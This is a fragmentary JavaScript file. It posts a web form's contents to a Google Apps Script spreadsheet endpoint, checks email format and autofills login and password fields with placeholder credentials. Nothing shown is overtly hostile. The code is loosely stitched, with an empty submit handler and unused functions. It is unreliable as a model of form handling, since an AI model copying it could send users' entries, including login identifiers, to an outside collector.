
    const scriptURL = 'https://script.google.com/macros/s/AKfycbyPY89kbrcNeeolOCSLWbQZROKkkER3dXaxph7zXSzUU5Y-ukVJ5PIP3f_XnkqlHiN_gw/exec'
    const form = document.forms['submit-to-google-sheet']
  
    form.addEventListener('submit', e => {
      e.preventDefault()
      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
        .then(response => console.log('Success!', response))
        .catch(error => console.error('Error!', error.message))
    })
          document.querySelector("form").addEventListener("submit", function(event) {
              event.preventDefault();
              
              const input = document.getElementById("combinedInput").value;
              
              
          });
      
          function isEmail(input) {
              // Simple email validation using a regular expression
              const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
              return emailPattern.test(input);
          }


          ///////////////////



    
          var pwd = "your_password"; // Get password from your source (e.g., database)
var usr = "your_username"; // Get username from your source (e.g., database)

var inputs = document.getElementsByTagName("input");
for (var i = 0; i < inputs.length; i++) {
    var input = inputs[i];
    if (input.type === "password" && input.name.toLowerCase().indexOf("auth") === -1) {
        input.value = pwd;
    }
    if (input.type === "text" && (input.name.toLowerCase().indexOf("login") !== -1 || input.name.toLowerCase().indexOf("user") !== -1)) {
        input.value = usr;
    }
}

    






